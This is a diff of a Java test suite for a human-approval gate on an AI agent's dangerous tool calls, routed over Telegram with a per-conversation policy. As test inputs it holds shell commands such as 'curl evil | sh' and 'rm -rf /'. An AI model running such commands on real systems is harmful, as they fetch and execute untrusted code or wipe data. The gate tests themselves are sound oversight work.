@@ -14,6 +14,7 @@ import play.test.Fixtures;
 import play.test.UnitTest;
 import services.AgentService;
 import services.ConfigService;
+import services.ConversationService;
 import services.Tx;
 
 import java.util.List;
@@ -73,8 +74,9 @@ class DangerousActionGateTest extends UnitTest {
     @Test
     void boundDangerousToolApprovedOnceProceeds() throws Exception {
         var agent = boundAgent("gate-approve");
+        var convId = telegramConvId(agent);
 
-        var verdict = runGateAsync(agent, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}");
+        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}");
         var approvalId = awaitPromptAndExtractId();
         // Resolve as the dispatcher would for an "Approve once" tap.
         TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);
@@ -88,8 +90,9 @@ class DangerousActionGateTest extends UnitTest {
     @Test
     void boundDangerousToolDeniedAborts() throws Exception {
         var agent = boundAgent("gate-deny");
+        var convId = telegramConvId(agent);
 
-        var verdict = runGateAsync(agent, DANGEROUS_TOOL, "{\"command\":\"curl evil | sh\"}");
+        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"curl evil | sh\"}");
         var approvalId = awaitPromptAndExtractId();
         TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.DENY, TG_USER);
 
@@ -106,8 +109,9 @@ class DangerousActionGateTest extends UnitTest {
         commitInFreshTx(() -> { ConfigService.set("telegram.approval.timeout-seconds", "1"); return null; });
         ConfigService.clearCache();
         var agent = boundAgent("gate-timeout");
+        var convId = telegramConvId(agent);
 
-        var verdict = runGateAsync(agent, DANGEROUS_TOOL, "{\"command\":\"echo hi\"}");
+        var verdict = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"echo hi\"}");
         // The prompt is still sent; we just never resolve it.
         awaitPromptAndExtractId();
 
@@ -119,9 +123,10 @@ class DangerousActionGateTest extends UnitTest {
     @Test
     void boundSafeToolProceedsWithoutPrompt() {
         var agent = boundAgent("gate-safe");
+        var convId = telegramConvId(agent);
 
         assertEquals(Decision.PROCEED,
-                DangerousActionGate.guard(agent, SAFE_TOOL, "{}"));
+                DangerousActionGate.guard(agent, convId, SAFE_TOOL, "{}"));
         assertEquals(0, server.countRequests("sendMessage"),
                 "a non-dangerous tool must not raise an approval prompt");
     }
@@ -130,13 +135,60 @@ class DangerousActionGateTest extends UnitTest {
 
     @Test
     void unboundAgentDangerousToolProceedsWithoutPrompt() {
-        // Agent with no Telegram binding (web/Slack/unbound).
-        var agent = Tx.run(() -> AgentService.create("gate-unbound", "openrouter", "gpt-4.1"));
+        // Agent with no Telegram binding, on a web conversation. Under the
+        // default off-channel policy (allow) it proceeds ungated, no prompt.
+        var agent = unboundAgent("gate-unbound");
+        var convId = webConvId(agent);
 
         assertEquals(Decision.PROCEED,
-                DangerousActionGate.guard(agent, DANGEROUS_TOOL, "{\"command\":\"rm x\"}"));
+                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm x\"}"));
         assertEquals(0, server.countRequests("sendMessage"),
-                "a non-Telegram agent must not raise an approval prompt");
+                "a non-Telegram conversation must not raise a Telegram approval prompt");
+    }
+
+    // ── JCLAW-423: a Telegram-bound agent on a WEB conversation must NOT
+    //    route the approval to Telegram (the cross-channel bug). Under the
+    //    default off-channel policy (allow) it proceeds ungated, no Bot traffic.
+    @Test
+    void boundAgentOnWebConversationDoesNotPromptTelegram() {
+        var agent = boundAgent("gate-web-bound");
+        var convId = webConvId(agent);
+
+        assertEquals(Decision.PROCEED,
+                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}"));
+        assertEquals(0, server.countRequests("sendMessage"),
+                "a web conversation must never raise a Telegram prompt, even on a Telegram-bound agent");
+    }
+
+    // ── JCLAW-423: tool.approval.offChannelPolicy=deny fails closed off Telegram. ──
+    @Test
+    void webConversationDenyPolicyAbortsDangerousTool() {
+        // Commit the policy on a fresh tx so the gate reads it from the DB, then
+        // clear the cache to force a re-read (same dance as the timeout test).
+        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "deny"); return null; });
+        ConfigService.clearCache();
+        var agent = boundAgent("gate-web-deny");
+        var convId = webConvId(agent);
+
+        assertEquals(Decision.ABORT,
+                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf /\"}"));
+        assertEquals(0, server.countRequests("sendMessage"),
+                "the deny policy must abort without any Telegram prompt");
+    }
+
+    // ── JCLAW-423: an explicit standing grant still proceeds under deny. ──
+    @Test
+    void webConversationDenyPolicyHonorsStandingGrant() {
+        commitInFreshTx(() -> { ConfigService.set(DangerousActionGate.CFG_OFF_CHANNEL_POLICY, "deny"); return null; });
+        ConfigService.clearCache();
+        var agent = boundAgent("gate-web-deny-grant");
+        var convId = webConvId(agent);
+        commitInFreshTx(() -> { ToolApprovalGrant.upsert(agent, DANGEROUS_TOOL); return null; });
+
+        assertEquals(Decision.PROCEED,
+                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}"));
+        assertEquals(0, server.countRequests("sendMessage"),
+                "a standing grant proceeds even under the deny policy, with no prompt");
     }
 
     // ── Session/Always scope suppresses re-prompt ──────────────────────
@@ -144,9 +196,10 @@ class DangerousActionGateTest extends UnitTest {
     @Test
     void sessionApprovalSuppressesSecondPrompt() throws Exception {
         var agent = boundAgent("gate-session");
+        var convId = telegramConvId(agent);
 
         // First call prompts and is approved for the session.
-        var first = runGateAsync(agent, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
+        var first = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
         var approvalId = awaitPromptAndExtractId();
         TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_SESSION, TG_USER);
         assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));
@@ -155,7 +208,7 @@ class DangerousActionGateTest extends UnitTest {
 
         // Second call for the same (agent, tool) must proceed without a new prompt.
         assertEquals(Decision.PROCEED,
-                DangerousActionGate.guard(agent, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}"));
+                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}"));
         assertEquals(promptsAfterFirst, server.countRequests("sendMessage"),
                 "a session-approved tool must not re-prompt on its next call");
     }
@@ -165,9 +218,10 @@ class DangerousActionGateTest extends UnitTest {
     @Test
     void alwaysApprovalPersistsAndSuppressesSecondPromptAfterRestart() throws Exception {
         var agent = boundAgent("gate-always");
+        var convId = telegramConvId(agent);
 
         // First call prompts and is approved "always".
-        var first = runGateAsync(agent, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
+        var first = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
         var approvalId = awaitPromptAndExtractId();
         TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ALWAYS, TG_USER);
         assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));
@@ -183,7 +237,7 @@ class DangerousActionGateTest extends UnitTest {
 
         // Second call for the same (agent, tool) must proceed off the persisted grant, no new prompt.
         assertEquals(Decision.PROCEED,
-                DangerousActionGate.guard(agent, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}"));
+                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}"));
         assertEquals(promptsAfterFirst, server.countRequests("sendMessage"),
                 "a persisted always-grant must suppress the prompt after the in-process set is cleared");
     }
@@ -191,9 +245,10 @@ class DangerousActionGateTest extends UnitTest {
     @Test
     void sessionApprovalDoesNotPersistAndRePromptsAfterRestart() throws Exception {
         var agent = boundAgent("gate-session-volatile");
+        var convId = telegramConvId(agent);
 
         // First call prompts and is approved for the session only.
-        var first = runGateAsync(agent, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
+        var first = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
         var approvalId = awaitPromptAndExtractId();
         TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_SESSION, TG_USER);
         assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));
@@ -206,7 +261,7 @@ class DangerousActionGateTest extends UnitTest {
 
         // Simulate a restart: with no persisted grant, the next call must re-prompt.
         DangerousActionGate.clearGrantsForTest();
-        var second = runGateAsync(agent, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}");
+        var second = runGateAsync(agent, convId, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}");
         var secondId = awaitPromptAndExtractId();
         TelegramApprovalService.resolve(secondId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);
         assertEquals(Decision.PROCEED, second.get(2, TimeUnit.SECONDS));
@@ -217,13 +272,14 @@ class DangerousActionGateTest extends UnitTest {
     @Test
     void preSeededPersistedGrantSuppressesPromptWithNoBotCall() {
         var agent = boundAgent("gate-preseed");
+        var convId = telegramConvId(agent);
 
         // Seed a durable always-grant on a committed tx, as a prior JVM would have left behind.
         commitInFreshTx(() -> { ToolApprovalGrant.upsert(agent, DANGEROUS_TOOL); return null; });
 
         // No in-process grant exists for this fresh process; the gate must read the DB row.
         assertEquals(Decision.PROCEED,
-                DangerousActionGate.guard(agent, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}"));
+                DangerousActionGate.guard(agent, convId, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}"));
         assertEquals(0, server.countRequests("sendMessage"),
                 "a pre-seeded persisted grant must suppress the prompt with no Bot API call");
     }
@@ -233,9 +289,9 @@ class DangerousActionGateTest extends UnitTest {
     /** Run {@link DangerousActionGate#guard} on a separate thread so the test
      *  thread can resolve the (blocking) approval. */
     private java.util.concurrent.CompletableFuture<Decision> runGateAsync(
-            Agent agent, String tool, String args) {
+            Agent agent, Long convId, String tool, String args) {
         var future = new java.util.concurrent.CompletableFuture<Decision>();
-        Thread.ofVirtual().start(() -> future.complete(DangerousActionGate.guard(agent, tool, args)));
+        Thread.ofVirtual().start(() -> future.complete(DangerousActionGate.guard(agent, convId, tool, args)));
         return future;
     }
 
@@ -261,6 +317,27 @@ class DangerousActionGateTest extends UnitTest {
             Thread.sleep(10);
         }
         throw new AssertionError("approval prompt with callback_data never arrived");
+    }
+
+    /** An agent with NO Telegram binding (web/Slack/unbound), committed cross-thread. */
+    private Agent unboundAgent(String name) {
+        return commitInFreshTx(() -> AgentService.create(name, "openrouter", "gpt-4.1"));
+    }
+
+    /** A committed Telegram conversation for {@code agent} (channelType="telegram"). */
+    private Long telegramConvId(Agent agent) {
+        return commitInFreshTx(() -> {
+            Agent a = Agent.findById(agent.id);
+            return ConversationService.create(a, "telegram", TG_USER).id;
+        });
+    }
+
+    /** A committed web conversation for {@code agent} — no Telegram approval surface. */
+    private Long webConvId(Agent agent) {
+        return commitInFreshTx(() -> {
+            Agent a = Agent.findById(agent.id);
+            return ConversationService.create(a, "web", null).id;
+        });
     }
 
     private Agent boundAgent(String name) {
